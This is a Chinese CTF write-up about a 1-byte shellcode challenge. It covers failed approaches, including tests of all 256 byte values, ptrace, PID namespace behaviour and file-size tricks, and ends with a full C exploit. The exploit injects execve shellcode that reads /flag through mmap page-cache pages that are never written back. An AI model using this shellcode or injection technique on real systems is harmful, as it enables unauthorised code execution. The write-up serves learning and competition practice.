## 壹...壹字节？

这题我尝试了很久，最后一天才试出来。不过做出后就索然无味了，知识点非常具体，大概也没什么意外解法吧。但总共只有10个人解出，是我做出来的题目中完成人数最少的。还是写一下探索过程吧。

### 测试所有1字节

写了个脚本测试所有可能的 256 个字节值。大部分是 segmentation fault 或者 illegal instruction，少数例外是：

- c2 / c3 即 `RET` 指令，会正常返回，没有错误；
- cc 即 `INT3` 指令，会触发 SIGTRAP 退出程序；
- ca / cb / cf 会导致 kernel panic。

所以真的只用1字节 shellcode 是做不出来的。

我花了很多时间思考这几个例外情况有什么可利用的，不成功思路包括：

- 受 `INT3` 启发，想到用 `ptrace` 追踪父进程，但父进程 `clone` 的时候开了 PID namespace，似乎没办法 attach 上；
- 子进程在 PID namespace 里是 PID 1 的进程，考虑有没有特殊操作绕开 SIGKILL，但也没找到什么方法，并且从 `man pid_namespaces` 了解到 PID 1 进程被杀后 _The kernel terminates all of the processes in the namespace via a SIGKILL signal_；
- 根据 kernel panic 的信息，内核是 5.19.9 版本，相当新，应该也没啥漏洞可利用。

### 操纵文件大小？

另一个思考的方向是，能不能创建一个 `st_size > 1`，但 `fstat` 读出来 size = 1 的文件。

软链接本身的 size 是指向路径长度决定的，指向1个字节文件名就能得到 `st_size = 1` 的软链接。但 `pwn.c` 中 `open` 时已经 follow 了软链接，`fstat` 并不会读到软链接本身的大小。

还考虑了有没有可能创建一个超大的 sparse file，使得 `st_size` 无法表示其大小而溢出。查到 64 位系统上 `st_size` 是64位有符号整数，但通过 `ftruncate` 能创建的最大文件大小也就局限在 `INT64_MAX` 了：

```
$ truncate -s 9223372036854775807 bigfile
$ ls -lh bigfile
-rw-r--r-- 1 cuihao cuihao 8.0E Oct 30 09:16 bigfile
$ truncate -s 9223372036854775808 bigfile
truncate: Invalid number: ‘9223372036854775808’: Value too large for defined data type
```

### 回到 mmap

最后解法就同官方题解，自己发现了 `mmap` 没写回的页面修改仍然会被 cache 并且影响其他进程，以此注入超过1字节的 shellcode：

```
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <signal.h>
#include <sys/mman.h>

const unsigned char shellcode[] = "H1\xc0PH\xbb/bin/catSH\x89\xe7H\xbb/flag\x00\x00\x00SH\x89\xe3PSWH\x89\xe6H1\xd2\xb0;\x0f\x05";
// xorq   %rax, %rax
// pushq  %rax
// movq   $0x7461632f6e69622f, %rbx
// pushq  %rbx
// movq   %rsp, %rdi  # (%rdi) = /bin/cat
// movq   $0x67616c662f, %rbx
// pushq  %rbx
// movq   %rsp, %rbx  # (%rbx) = /flag
// pushq  %rax
// pushq  %rbx
// pushq  %rdi
// movq   %rsp, %rsi
// xorq   %rdx, %rdx
// movb   $0x3b, %al
// syscall

int main() {
    int fd = open("shellcode", O_RDWR | O_CREAT, (mode_t)0600);
    write(fd, "\x90", 1);
    fsync(fd);

    char *buf = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED, fd, 0); 
    
    memcpy(buf + 1, shellcode, sizeof(shellcode));

    return 0;
}
```

